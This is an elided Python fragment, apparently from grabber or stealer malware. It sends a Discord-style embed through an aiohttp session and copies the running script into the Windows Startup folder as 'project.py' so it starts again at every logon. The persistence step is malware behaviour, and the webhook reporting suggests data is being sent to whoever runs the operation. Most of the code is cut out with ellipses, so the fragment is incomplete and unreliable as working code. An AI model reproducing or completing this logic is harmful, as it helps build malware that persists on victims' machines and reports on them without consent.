        ...
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    ...
                    "thumbnail": {"url": "https://github.com/invisibleghostshell-ux/lua/blob/main/photo_2024-08-02_22-49-08.jpg"}}
        ...
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                ...
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "project.py")):
                    ...
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "project.py"))
        except Exception as e:
            print(str(e))
